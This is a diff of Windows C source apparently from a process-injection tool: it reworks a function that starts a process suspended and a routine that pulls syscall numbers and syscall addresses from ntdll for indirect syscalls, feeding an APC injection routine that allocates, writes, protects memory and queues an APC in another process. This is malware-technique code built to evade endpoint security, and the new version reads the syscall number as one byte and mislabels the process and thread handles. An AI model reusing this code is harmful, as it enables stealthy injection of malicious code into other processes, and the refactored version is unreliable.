@@ -6,86 +6,72 @@
 BOOL CreateSuspendedProcess
 (
 	IN LPCSTR ProcessName,
-	OUT DWORD* PID,
-	OUT HANDLE* hProcess,
-	OUT HANDLE* hThread
+	OUT PHANDLE hProcess,
+	OUT PHANDLE hThread,
+	OUT PDWORD PID
 )
-
 {
 
 	BOOL State = TRUE;
+	STARTUPINFOA StartupInfo;
+	PROCESS_INFORMATION ProcessInfo;
 
-	WCHAR lpPath[MAX_PATH * 2] = { 0 };
-	CHAR WnDr[MAX_PATH] = { 0 };
+	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
+	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
 
-	STARTUPINFO si = { 0 };
-	PROCESS_INFORMATION pi = { 0 };
+	StartupInfo.cb = sizeof(STARTUPINFO);
 
-	RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
-	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-
-	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH))
+	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
 	{
-		WARN("GetEnvironmentVariableA Failed! With an Error: %d", GetLastError());
-		return FALSE;
+		WARN("CreateProcessA: %ld", GetLastError());
+		State = FALSE; goto CLEANUP;
 	}
 
-
-	sprintf(lpPath, "%s\\System32\\%s", WnDr, ProcessName);
-
-
-	si.cb = sizeof(STARTUPINFO);
-
-	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
+	if (!ProcessInfo.hProcess)
 	{
-		WARN("CreateProcessA Failed! With an Error: %lu", GetLastError());
-		State = FALSE;
+		WARN("Failed to Create Process");
+		State = FALSE; goto CLEANUP;
 	}
 
-	OKAY("[0x%p] Created Process: %d", pi.hProcess, pi.dwProcessId);
+	INFO("[0x%p] Thread Handle", ProcessInfo.hProcess);
+	INFO("[0x%p] Process Handle", ProcessInfo.hThread);
+	INFO("[%d] Process ID", ProcessInfo.dwProcessId);
 
-	*PID = pi.dwProcessId;
-	*hProcess = pi.hProcess;
-	*hThread = pi.hThread;
+	*PID = ProcessInfo.dwProcessId;
+	*hProcess = ProcessInfo.hProcess;
+	*hThread = ProcessInfo.hThread;
 
-	return TRUE;
+
+CLEANUP:
+
+	return State;
 
 }
 
-VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT PUINT_PTR FuncSys)
+VOID IDSC
+(
+	IN HMODULE ntdll,
+	IN LPCSTR NtApi,
+	OUT DWORD* FuncSSN,
+	OUT PUINT_PTR FuncSyscall
+)
 {
 
-	DWORD SyscallNumber = 0;
+	if (!FuncSSN || !FuncSyscall)
+		return;
 
-	UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };
-
-	UINT_PTR NtFunctionAddress = 0;
-
-	NtFunctionAddress = (UINT_PTR)GetProcAddress(mod, FuncName);
-	if (NtFunctionAddress == 0)
+	UINT_PTR NtFunction = (UINT_PTR)GetProcAddress(ntdll, NtApi);
+	if (!NtFunction)
 	{
-		WARN("GetProcAddress Failed! With an Error: %ld", GetLastError());
+		WARN("Could Not Resolve Nt Function! Reason: %ld", GetLastError());
 		return;
 	}
 
-	BYTE byte4 = ((PBYTE)NtFunctionAddress)[4];
-	BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];
-	*FuncSSN = (byte5 << 8) | byte4;
 
-	*FuncSys = NtFunctionAddress + 0x12;
+	*FuncSyscall = NtFunction + 0x12;
+	*FuncSSN = ((unsigned char*)NtFunction + 4)[0];
 
-
-	if (memcmp(SyscallOpcodes, (PVOID)*FuncSys, sizeof(SyscallOpcodes)) == 0) {
-		INFO("[0x%p] [0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, (PVOID)*FuncSys, *FuncSSN, FuncName);
-		return;
-	}
-
-	else {
-		WARN("expected syscall signature: \"0x0f05\" didn't match.");
-		return;
-	}
-
-	// courtesy of Crr0ww for this function
+	INFO("[SSN: 0x%p] | [Syscall: 0x%p] | %s", *FuncSSN, (PVOID)*FuncSyscall, NtApi);
 
 }
 
@@ -126,11 +112,11 @@ BOOL ApcInject
 	}
 	OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);
 
-	IndirectPrelude(NtdllHandle, "NtAllocateVirtualMemory", &fn_NtAllocateVirtualMemorySSN, &fn_NtAllocateVirtualMemorySyscall);
-	IndirectPrelude(NtdllHandle, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
-	IndirectPrelude(NtdllHandle, "NtProtectVirtualMemory", &fn_NtProtectVirtualMemorySSN, &fn_NtProtectVirtualMemorySyscall);
-	IndirectPrelude(NtdllHandle, "NtQueueApcThread", &fn_NtQueueApcThreadSSN, &fn_NtQueueApcThreadSyscall);
-	IndirectPrelude(NtdllHandle, "NtFreeVirtualMemory", &fn_NtFreeVirtualMemorySSN, &fn_NtFreeVirtualMemorySyscall);
+	IDSC(NtdllHandle, "NtAllocateVirtualMemory", &fn_NtAllocateVirtualMemorySSN, &fn_NtAllocateVirtualMemorySyscall);
+	IDSC(NtdllHandle, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
+	IDSC(NtdllHandle, "NtProtectVirtualMemory", &fn_NtProtectVirtualMemorySSN, &fn_NtProtectVirtualMemorySyscall);
+	IDSC(NtdllHandle, "NtQueueApcThread", &fn_NtQueueApcThreadSSN, &fn_NtQueueApcThreadSyscall);
+	IDSC(NtdllHandle, "NtFreeVirtualMemory", &fn_NtFreeVirtualMemorySSN, &fn_NtFreeVirtualMemorySyscall);
 
 
 	/*----------------------------------------------------------[Allocating Virtual Memory]------------------------------------------------------*/
